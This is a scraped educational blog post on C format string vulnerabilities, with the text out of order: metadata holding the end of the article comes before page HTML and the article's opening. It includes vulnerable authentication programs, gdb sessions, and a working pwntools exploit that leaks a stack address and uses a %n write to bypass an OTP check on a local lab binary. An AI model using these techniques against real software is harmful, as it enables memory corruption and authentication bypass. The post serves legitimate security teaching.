(37B) [DEBUG] Received 0x25 bytes: b'Authentication Failed\\n' b'Access Granted\\n' [*] Process './vuln_canary' stopped with exit code -11 (SIGSEGV) (pid 3978) [*] Program output: Authentication Failed Access Granted [+] SUCCESS: Exploit worked Exploit 3: Overwriting the isAuthenticate variable using %n What %n actually does? In printf-family functions:\nprintf(\"hello%n\", \u0026x); What happens internally\nprintf keeps a counter: “how many characters have I printed so far?” When it sees %n: It does not print anything It writes that count into the pointer argument So if “hello” is printed (5 chars): then x will be 5.\nVariants\nSpecifier Writes %n 4 bytes (int *) %hn 2 bytes (short *) %hhn 1 byte (char *) %ln 8 bytes (long *) Why %n is dangerous?\nOur vulnerable line:\nprintf(username); You control:\nthe format string which arguments printf thinks exist That means:\nYou can read arbitrary stack values (%p, %x) You can write to arbitrary addresses (%n) This is stronger than buffer overflow.\nOverwriting isAuthenticated variable on Stack From our earlier stack, rbp-0x14 → isAuthenticated (int)\nSo if we can: 1.\tFind the address of isAuthenticated 2.\tPass it as a fake argument to printf 3.\tUse %n\nHow %n arguments work? Even though no arguments were passed, printf will: •\twalk registers •\tthen stack •\tand use whatever value happens to be there\nThis is why %11$p worked for leaks.\nLet’s consider this program\n#include #include void grantAccess() { printf(\"Access Granted\\n\"); } void checkOtp(char* otp, int *isAuthenticated) { if (strcmp(otp, \"X7pA9kQ2\") == 0) { *isAuthenticated = 1; } } void AuthenticateUser() { char username[8]; char otp[8]; int isAuthenticated = 0; printf(\"Enter Username: \"); scanf(\"%s\", username); printf(\"Enter otp for: \"); printf(username); scanf(\"%s\", otp); printf(\"You entered otp: \"); printf(otp); checkOtp(otp, \u0026isAuthenticated); if (isAuthenticated == 1) { grantAccess(); } else { printf(\"Authentication Failed\\n\"); } } int main() { AuthenticateUser(); } It has two vulnerable printf’s. Our idea is to leak address of isAuthenticated with first one and overwrite isAuthenticated using %n in second one.\n$ gcc -O0 -o vuln main2.c main2.c: In function ‘AuthenticateUser’: main2.c:28:16: warning: format not a string literal and no format arguments [-Wformat-security] 28 | printf(username); | ^~~~~~~~ main2.c:31:12: warning: format not a string literal and no format arguments [-Wformat-security] 31 | printf(otp); | ^~~ The stack frame of AuthenticateUser looks like this\nHigher addresses ┌──────────────────────────────────────────┐ │ rbp+8 │ Return address │ ├──────────────────────────────────────────┤ │ rbp+0 │ Saved RBP │ ├──────────────────────────────────────────┤ │ rbp-0x8 │ Stack Canary (8 bytes) │ │ │ ends with 0x00 ← intentional │ ├──────────────────────────────────────────┤ │ rbp-0x10│ otp[8] │ ├──────────────────────────────────────────┤ │ rbp-0x18│ username[8] │ ├──────────────────────────────────────────┤ │ rbp-0x1c│ isAuthenticated (int, 4 bytes) │ ├──────────────────────────────────────────┤ │ rbp-0x20│ Padding (4 bytes, alignment) │ └──────────────────────────────────────────┘ Lower addresses So the address of isAuthenticated can be obtained by address of username - 0x4. We can leak the address of username first by printing the first argument to printf that is present in rdi.\nUnfortunately this idea of leaking username doesn’t work.\nBreakpoint 2, 0x000055555555528f in AuthenticateUser () at main2.c:28 28\tprintf(username); (gdb) info registers rdi rsi rdx rcx r8 r9 rdi 0x7fffffffde98 140737488346776 rsi 0x746f207265746e45 8389960306515013189 rdx 0x0 0 rcx 0x0 0 r8 0xa 10 r9 0xffffffff 4294967295 (gdb) p \u0026username $1 = (char (*)[8]) 0x7fffffffde98 (gdb) $2 = (char (*)[8]) 0x7fffffffde98 Because although \u0026username is present in rdi, printf’s va_list starts from rsi. Still rsi should’ve contained \u0026username because previously scanf had written to it\nDump of assembler code for function AuthenticateUser: 0x000055555555521e \u003c+0\u003e:\tendbr64 0x0000555555555222 \u003c+4\u003e:\tpush rbp 0x0000555555555223 \u003c+5\u003e:\tmov rbp,rsp 0x0000555555555226 \u003c+8\u003e:\tsub rsp,0x20 =\u003e 0x000055555555522a \u003c+12\u003e:\tmov rax,QWORD PTR fs:0x28 0x0000555555555233 \u003c+21\u003e:\tmov QWORD PTR [rbp-0x8],rax 0x0000555555555237 \u003c+25\u003e:\txor eax,eax 0x0000555555555239 \u003c+27\u003e:\tmov DWORD PTR [rbp-0x1c],0x0 0x0000555555555240 \u003c+34\u003e:\tlea rax,[rip+0xdd5] # 0x55555555601c 0x0000555555555247 \u003c+41\u003e:\tmov rdi,rax 0x000055555555524a \u003c+44\u003e:\tmov eax,0x0 0x000055555555524f \u003c+49\u003e:\tcall 0x5555555550b0 0x0000555555555254 \u003c+54\u003e:\tlea rax,[rbp-0x18] 0x0000555555555258 \u003c+58\u003e:\tmov rsi,rax 0x000055555555525b \u003c+61\u003e:\tlea rax,[rip+0xdcb] # 0x55555555602d 0x0000555555555262 \u003c+68\u003e:\tmov rdi,rax 0x0000555555555265 \u003c+71\u003e:\tmov eax,0x0 0x000055555555526a \u003c+76\u003e:\tcall 0x5555555550d0 \u003c__isoc99_scanf@plt\u003e 0x000055555555526f \u003c+81\u003e:\tlea rax,[rip+0xdba] # 0x555555556030 0x0000555555555276 \u003c+88\u003e:\tmov rdi,rax 0x0000555555555279 \u003c+91\u003e:\tmov eax,0x0 0x000055555555527e \u003c+96\u003e:\tcall 0x5555555550b0 0x0000555555555283 \u003c+101\u003e:\tlea rax,[rbp-0x18] 0x0000555555555287 \u003c+105\u003e:\tmov rdi,rax 0x000055555555528a \u003c+108\u003e:\tmov eax,0x0 0x000055555555528f \u003c+113\u003e:\tcall 0x5555555550b0 0x0000555555555294 \u003c+118\u003e:\tlea rax,[rbp-0x10] 0x0000555555555298 \u003c+122\u003e:\tmov rsi,rax 0x000055555555529b \u003c+125\u003e:\tlea rax,[rip+0xd8b] # 0x55555555602d But somewhere in between it was modified by libc, since its not callee restored, we lost that value, but anyway this approach was not reliable.\nAlternate way of leaking a stack address Our goal is not to leak the exact address of isAuthenticated, we need to leak any stack address. Since the stack layout is predictable, we can derive all other addresses using the found address. Since our previous attempt of leaking username failed, the only other stack address lying on stack itself is saved rbp of main.\n(gdb) disass main Dump of assembler code for function main: 0x0000555555555321 \u003c+0\u003e:\tendbr64 0x0000555555555325 \u003c+4\u003e:\tpush rbp 0x0000555555555326 \u003c+5\u003e:\tmov rbp,rsp 0x0000555555555329 \u003c+8\u003e:\tmov eax,0x0 0x000055555555532e \u003c+13\u003e:\tcall 0x55555555521e 0x0000555555555333 \u003c+18\u003e:\tmov eax,0x0 0x0000555555555338 \u003c+23\u003e:\tpop rbp 0x0000555555555339 \u003c+24\u003e:\tret End of assembler dump. There is no space allocate for main’s stack frame. This is it.\nHigher addresses ┌──────────────────────────┐ │ return address to _start │ ← [rbp+8] ├──────────────────────────┤ │ saved rbp (from _start) │ ← [rbp] └──────────────────────────┘ Lower addresses So isAuthenticated is at main's rbp - 0x2C (44 bytes).\nSince saved RBP is 32 bytes below rsp, we need to leak the 4th argument on stack, i.e., 6 (registers) + 4 = 10th argument.\n$ ./vuln Enter Username: %10$p Enter otp for: 0x7fff0093a0e0 So address of isAuthenticated is 0x7fff0093a0e0 - 0x2C = 0x7fff0093a0b4\nOverwriting the isAuthenticated If we attempt to build the payload like [ address of isAuthenticated (8 bytes) ][ %8$n ]\nWe will end up overwriting the stack canary since the buffer is more than 8 bytes and the otp variable is right next to the canary. But the even bigger problem is userspace addresses look like this in linux 0x00007fffffffdec0\n0x00007fffffffdec0 ^^^^ These are ALWAYS null bytes! This is because:\nx64 uses 64-bit addresses (8 bytes) But only 48 bits are actually used for virtual addresses The upper 16 bits are always zero (canonical addressing) When we write it into memory in little endian it will look like this\n0x7fffffffdea0:\t0x94\t0xde\t0xff\t0xff\t0xff\t0x7f\t0x00\t0x00 The issue here is printf stops processing at null bytes and never reaches the format arguments.\nTo overcome this, we need to build payload in this format\n[padding/format_string] [address_at_the_end] Now the actual otp string moved by 8 bytes, we change 8 to 9. Payload will look like '%9$nXXXX' + '0x7fffffffde94'\nAnd since the value of isAuthenticated need to be exactly 1, we will change the argument to h%9$nXXX, now it will print one character h and sees %9$n, then it moves the arg_ptr to where otp string is present, but its value is the address of isAuthenticated. So it will dereference that address and ends up wriiting 1 there.\npwntools script for same\n#!/usr/bin/env python3 from pwn import * import re context.binary = \"./vuln\" context.log_level = \"debug\" def main(): print(\"[*] Launching process\") p = process(\"./vuln\", stdin=PTY, stdout=PTY) # ------------------------- # Stage 1: Leak main RBP # ------------------------- print(\"[*] Waiting for Username prompt\") p.recvuntil(b\"Enter Username: \") print(\"[*] Sending format string leak\") p.sendline(b\"%10$p\") print(\"[*] Reading leak output\") data = p.recvuntil(b\"Enter otp for: \", timeout=2) data += p.recv(timeout=0.2) # \u003c-- CRITICAL: drain inline leak print(f\"[DEBUG] Full leak buffer:\\n{data}\") leaks = re.findall(rb\"0x[0-9a-fA-F]+\", data) if not leaks: log.failure(\"Failed to extract leaked RBP\") p.close() return main_rbp = int(leaks[0], 16) log.success(f\"Leaked main RBP: {hex(main_rbp)}\") # ------------------------- # Stage 2: Calculate target # ------------------------- is_auth = main_rbp - 0x2c log.success(f\"isAuthenticated @ {hex(is_auth)}\") # ------------------------- # Stage 3: %n payload # ------------------------- payload = b\"h\" # prints 1 byte payload += b\"%9$n\" # writes 1 to *(arg9) payload += b\"XXX\" payload += p64(is_auth) payload += b\"\\n\" print(f\"[DEBUG] Payload bytes: {payload}\") # ------------------------- # Stage 4: Trigger write # ------------------------- print(\"[*] Sending OTP payload\") p.send(payload) # ------------------------- # Stage 5: Read result # ------------------------- out = p.recvall(timeout=1) print(\"[*] Program output:\") print(out.decode(errors=\"ignore\")) if b\"Access Granted\" in out: print(\"[+] SUCCESS\") else: print(\"[-] FAILURE\") p.close() if __name__ == \"__main__\": main() [*] '/home/sanketh/assembly/vuln/buffer_overflow/stack_based_buffer_overflow/format_strings/vuln' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled SHSTK: Enabled IBT: Enabled Stripped: No [*] Launching process [+] Starting local process './vuln' argv=[b'./vuln'] : pid 9369 [*] Waiting for Username prompt [DEBUG] Received 0x10 bytes: b'Enter Username: ' [*] Sending format string leak [DEBUG] Sent 0x6 bytes: b'%10$p\\n' [*] Reading leak output [DEBUG] Received 0x1d bytes: b'Enter otp for: 0x7ffc5e8deac0' [DEBUG] Full leak buffer: b'Enter otp for: 0x7ffc5e8deac0' [+] Leaked main RBP: 0x7ffc5e8deac0 [+] isAuthenticated @ 0x7ffc5e8dea94 [DEBUG] Payload bytes: b'h%9$nXXX\\x94\\xea\\x8d^\\xfc\\x7f\\x00\\x00\\n' [*] Sending OTP payload [DEBUG] Sent 0x11 bytes: 00000000 68 25 39 24 6e 58 58 58 94 ea 8d 5e fc 7f 00 00 │h%9$│nXXX│···^│····│ 00000010 0a │·│ 00000011 [+] Receiving all data: Done (86B) [DEBUG] Received 0x56 bytes: 00000000 59 6f 75 20 65 6e 74 65 72 65 64 20 6f 74 70 3a │You │ente│red │otp:│ 00000010 20 68 58 58 58 94 ea 8d 5e fc 7f 41 63 63 65 73 │ hXX│X···│^··A│cces│ 00000020 73 20 47 72 61 6e 74 65 64 0a 2a 2a 2a 20 73 74 │s Gr│ante│d·**│* st│ 00000030 61 63 6b 20 73 6d 61 73 68 69 6e 67 20 64 65 74 │ack │smas│hing│ det│ 00000040 65 63 74 65 64 20 2a 2a 2a 3a 20 74 65 72 6d 69 │ecte│d **│*: t│ermi│ 00000050 6e 61 74 65 64 0a │nate│d·│ 00000056 [*] Stopped process './vuln' (pid 9369) [*] Program output: You entered otp: hXXX^\\x7fAccess Granted *** stack smashing detected ***: terminated [+] SUCCESS ","wordCount":"5603","inLanguage":"en","datePublished":"2025-12-10T00:00:00Z","dateModified":"2025-12-10T00:00:00Z","author":{"@type":"Person","name":"Sanketh"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://sankethbk.github.io/blog/posts/reverse-engineering/vulnerabilities/2025-12-10-format-string/"},"publisher":{"@type":"Organization","name":"Sanketh's Blog","logo":{"@type":"ImageObject","url":"https://sankethbk.github.io/blog/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://sankethbk.github.io/blog/ accesskey=h title="Sanketh's Blog (Alt + H)">Sanketh's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu></ul></nav></header><main class=main><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.js></script><script defer src=https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Format String Vulnerability</h1><div class=post-meta><span title='2025-12-10 00:00:00 +0000 UTC'>December 10, 2025</span>&nbsp;·&nbsp;27 min&nbsp;·&nbsp;Sanketh&nbsp;|&nbsp;<a href=https://github.com/SankethBK/blog/edit/main/content/posts/reverse-engineering/vulnerabilities/2025-12-10-format-string.md rel="noopener noreferrer edit" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#format-string-vulnerabilities aria-label="Format String Vulnerabilities">Format String Vulnerabilities</a><ul><li><a href=#why-information-leaks-matter-in-modern-exploitation aria-label="Why Information Leaks Matter in Modern Exploitation">Why Information Leaks Matter in Modern Exploitation</a><ul><li><a href=#the-aslr-problem aria-label="The ASLR Problem">The ASLR Problem</a></li></ul></li><li><a href=#format-strings-in-c aria-label="Format Strings in C">Format Strings in C</a><ul><li><a href=#common-format-specifiers aria-label="Common format specifiers">Common format specifiers</a></li><li><a href=#how-printf-actually-processes-arguments aria-label="How printf actually processes arguments?">How printf actually processes arguments?</a></li><li><a href=#variadic-functions-the-critical-design-choice aria-label="Variadic functions: the critical design choice">Variadic functions: the critical design choice</a><ul><li><a href=#where-do-the-arguments-come-from aria-label="Where do the arguments come from?">Where do the arguments come from?</a></li></ul></li></ul></li><li><a href=#the-vulnerability-user-input-as-format-string aria-label="The Vulnerability: User Input as Format String">The Vulnerability: User Input as Format String</a><ul><li><a href=#sample-program-with-vulnerability aria-label="Sample Program With Vulnerability">Sample Program With Vulnerability</a></li><li><a href=#exploit-1-leak-the-stack-adresses-and-replace-the-return-address-of-authenticateuser-to-grantaccess aria-label="Exploit 1: Leak the Stack Adresses and Replace the Return Address of AuthenticateUser to grantAccess">Exploit 1: Leak the Stack Adresses and Replace the Return Address of AuthenticateUser to grantAccess</a><ul><li><a href=#calculating-key-distances aria-label="Calculating Key Distances">Calculating Key Distances</a><ul><li><a href=#1-distance-of-password-from-saved-ra aria-label="1. Distance of Password From Saved RA">1. Distance of Password From Saved RA</a></li><li><a href=#2-the-actual-address-of-grantaccess aria-label="2. The Actual Address of grantAccess">2. The Actual Address of grantAccess</a></li><li><a href=#3-correct-argument-to-leak-from-printf aria-label="3. Correct Argument to Leak From printf">3. Correct Argument to Leak From printf</a></li></ul></li><li><a href=#building-the-payload-for-buffer-overflow aria-label="Building the Payload for Buffer Overflow">Building the Payload for Buffer Overflow</a></li></ul></li><li><a href=#exploit-2-buffer-overflow-with-stack-canary-enabled aria-label="Exploit 2: Buffer Overflow with Stack Canary Enabled">Exploit 2: Buffer Overflow with Stack Canary Enabled</a><ul><li><a href=#why-stack-canary-has-last-8-bits-set-to-0 aria-label="Why Stack Canary has Last 8 bits set to 0">Why Stack Canary has Last 8 bits set to 0</a></li><li><a href=#leaking-the-address aria-label="Leaking the Address">Leaking the Address</a></li><li><a href=#overflowing-the-buffer aria-label="Overflowing the Buffer">Overflowing the Buffer</a></li></ul></li><li><a href=#exploit-3-overwriting-the-isauthenticate-variable-using-n aria-label="Exploit 3: Overwriting the isAuthenticate variable using %n">Exploit 3: Overwriting the isAuthenticate variable using %n</a><ul><li><a href=#what-n-actually-does aria-label="What %n actually does?">What %n actually does?</a></li><li><a href=#overwriting-isauthenticated-variable-on-stack aria-label="Overwriting isAuthenticated variable on Stack">Overwriting isAuthenticated variable on Stack</a></li><li><a href=#how-n-arguments-work aria-label="How %n arguments work?">How %n arguments work?</a></li><li><a href=#alternate-way-of-leaking-a-stack-address aria-label="Alternate way of leaking a stack address">Alternate way of leaking a stack address</a></li><li><a href=#overwriting-the-isauthenticated aria-label="Overwriting the isAuthenticated">Overwriting the isAuthenticated</a></li></ul></li></ul></li></ul></li></ul></div></details></div><div class=post-content><h1 id=format-string-vulnerabilities>Format String Vulnerabilities<a hidden class=anchor aria-hidden=true href=#format-string-vulnerabilities>#</a></h1><h2 id=why-information-leaks-matter-in-modern-exploitation>Why Information Leaks Matter in Modern Exploitation<a hidden class=anchor aria-hidden=true href=#why-information-leaks-matter-in-modern-exploitation>#</a></h2><h3 id=the-aslr-problem>The ASLR Problem<a hidden class=anchor aria-hidden=true href=#the-aslr-problem>#</a></h3><p>Modern systems use Address Space Layout Randomization (ASLR) to randomize memory locations:</p><ul><li>Stack addresses change every execution</li><li>Heap addresses randomized</li><li>Library (libc) addresses randomized</li><li>Code addresses randomized (with PIE)</li></ul><p><strong>The dilemma:</strong></p><ul><li>You can overflow a buffer and control the return address (this is again assuming we somehow defeated the canary)</li><li>But you don&rsquo;t know WHERE to point it (shellcode location unknown)</li><li>Even ROP gadget addresses are randomized</li><li>You need to LEAK memory addresses first!</li></ul><p>Format string vulnerabilities are one of the most powerful information leak primitives.</p><h2 id=format-strings-in-c>Format Strings in C<a hidden class=anchor aria-hidden=true href=#format-strings-in-c>#</a></h2><p>Format strings are used by functions like <code>printf</code>, <code>sprintf</code>, <code>fprintf</code> to format output with placeholders. These are not simple string printers. They are mini interpreters.</p><p>Example</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;x = %d, y = %d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, x, y);
</span></span></code></pre></div><p>Here:
<code>"x = %d, y = %d\n"</code> is not data It is a program that tells printf:</p><ol><li>Print literal text <code>x =</code></li><li>Fetch an integer argument → print it as decimal</li><li>Print , <code>y =</code></li><li>Fetch another integer argument → print it</li><li>Print newline</li></ol><p>So: A format string is instructions for how to consume arguments and produce output.</p><h3 id=common-format-specifiers>Common format specifiers<a hidden class=anchor aria-hidden=true href=#common-format-specifiers>#</a></h3><pre tabindex=0><code>| Specifier | Meaning  | How argument is interpreted |
| --------- | -------- | --------------------------- |
| `%d`      | decimal  | `int`                       |
| `%u`      | unsigned | `unsigned int`              |
| `%x`      | hex      | `unsigned int`              |
| `%p`      | pointer  | `void*`                     |
| `%s`      | string   | pointer → dereference       |
| `%c`      | char     | integer → cast              |
| `%f`      | float    | double (promotion rules)    |
| `%n`      | Write count to memory | (no output)    |
</code></pre><p>We can also pass width, precision, and modifiers</p><pre tabindex=0><code>%08x
%.3f
%10s
%lld
</code></pre><p>These don’t change where data comes from — they change how it’s formatted.</p><h3 id=how-printf-actually-processes-arguments>How printf actually processes arguments?<a hidden class=anchor aria-hidden=true href=#how-printf-actually-processes-arguments>#</a></h3><pre tabindex=0><code>arg_ptr = start_of_arguments;

for each character in format_string:
    if character != &#39;%&#39;:
        print(character)
    else:
        specifier = parse_specifier()
        value = *arg_ptr
        arg_ptr++
        print(value according to specifier)
</code></pre><p>We can. see what’s missing:</p><ul><li>No check that <code>arg_ptr</code> is valid</li><li>No check that caller provided enough arguments</li><li>No type safety</li></ul><h3 id=variadic-functions-the-critical-design-choice>Variadic functions: the critical design choice<a hidden class=anchor aria-hidden=true href=#variadic-functions-the-critical-design-choice>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>printf</span>(<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>fmt, ...);
</span></span></code></pre></div><p>This means:
• The compiler does not know how many arguments are passed
• Only the format string tells printf how many arguments exist
• There is no runtime verification</p><p>So <code>printf</code> blindly trusts the format string. This is not a bug — it’s how C was designed.</p><h4 id=where-do-the-arguments-come-from>Where do the arguments come from?<a hidden class=anchor aria-hidden=true href=#where-do-the-arguments-come-from>#</a></h4><p>In 32-bit x86 all arguments of <code>printf</code> will be on stack.</p><p><strong>Stack layout:</strong></p><pre tabindex=0><code>High addresses
┌─────────────────┐
│ arg3            │
├─────────────────┤
│ arg2            │
├─────────────────┤
│ arg1            │
├─────────────────┤
│ format string   │ ← printf&#39;s first argument
├─────────────────┤
│ return address  │
└─────────────────┘
Low addresses
</code></pre><p>64-bit x86-64 (AMD64) - First 6 in Registers. Calling convention (System V AMD64 ABI):</p><pre tabindex=0><code>- RDI = 1st argument (format string)
- RSI = 2nd argument
- RDX = 3rd argument
- RCX = 4th argument
- R8  = 5th argument
- R9  = 6th argument
- Stack = 7th argument onwards
</code></pre><p>This doesn&rsquo;t change much, it just means it will leak addresses only when there are more than 7 format specifiers and not enough values.</p><h2 id=the-vulnerability-user-input-as-format-string>The Vulnerability: User Input as Format String<a hidden class=anchor aria-hidden=true href=#the-vulnerability-user-input-as-format-string>#</a></h2><p>The critical mistake is passing user input as a format string.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>char</span> user_input[<span style=color:#ae81ff>100</span>];
</span></span><span style=display:flex><span><span style=color:#a6e22e>fgets</span>(user_input, <span style=color:#66d9ef>sizeof</span>(user_input), stdin);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// DANGEROUS: User input used directly as format string
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>printf</span>(user_input);
</span></span></code></pre></div><p><strong>Why this is dangerous:</strong></p><ul><li>User controls the format string</li><li>User can inject format specifiers like <code>%x</code>, <code>%s</code>, <code>%n</code></li><li>These specifiers will read or write memory without authorization</li><li>Can lead to information disclosure or arbitrary code execution</li></ul><h3 id=sample-program-with-vulnerability>Sample Program With Vulnerability<a hidden class=anchor aria-hidden=true href=#sample-program-with-vulnerability>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>grantAccess</span>() {
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Access Granted</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>checkPassword</span>(<span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> password, <span style=color:#66d9ef>int</span> <span style=color:#f92672>*</span>isAuthenticated) {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>strcmp</span>(password, <span style=color:#e6db74>&#34;admin123&#34;</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>		<span style=color:#f92672>*</span>isAuthenticated <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>AuthenticateUser</span>() {
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> password[<span style=color:#ae81ff>8</span>];
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> username[<span style=color:#ae81ff>8</span>];
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span>  isAuthenticated <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Enter Username: &#34;</span>);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>scanf</span>(<span style=color:#e6db74>&#34;%s&#34;</span>, username);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Enter password for: &#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(username);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>scanf</span>(<span style=color:#e6db74>&#34;%s&#34;</span>, password);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>checkPassword</span>(password, <span style=color:#f92672>&amp;</span>isAuthenticated);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (isAuthenticated <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>) {
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>grantAccess</span>();
</span></span><span style=display:flex><span>	} <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Authentication Failed</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>() {
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>AuthenticateUser</span>();
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>This is a version of the program we previously used in buffer overflows, but this time we will do it without disabling ASLR and without inspecting with GDB.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-c data-lang=c><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(username);
</span></span></code></pre></div><p>This is the line which allows us to exploit format string vulnerability. A safe version would&rsquo;ve been</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-c data-lang=c><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;%s&#34;</span>, username);
</span></span></code></pre></div><p>We still need to disable stackguard as our attack is based on buffer overflow</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>$ gcc -fno-stack-protector  -O0 -o vuln  main.c
</span></span><span style=display:flex><span>main.c: In <span style=color:#66d9ef>function</span> ‘AuthenticateUser’:
</span></span><span style=display:flex><span>main.c:26:17: warning: format not a string literal and no format arguments <span style=color:#f92672>[</span>-Wformat-security<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>26</span> |          printf<span style=color:#f92672>(</span>username<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>      |                 ^~~~~~~~
</span></span></code></pre></div><p>We can see gcc shows us warning that we are passing only format string an not arguments. Static analysis can catch format strings vulnerability very effectively.</p><p>Let&rsquo;s look at the assembly of <code>AuthenticateUser</code> function to confirm the vulenrability</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>$ objdump -d -M intel,mnemonic,no-att -j .text vuln
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>00000000000011fe &lt;AuthenticateUser&gt;:
</span></span><span style=display:flex><span>    11fe:	f3 0f 1e fa          	endbr64
</span></span><span style=display:flex><span>    1202:	<span style=color:#ae81ff>55</span>                   	push   rbp
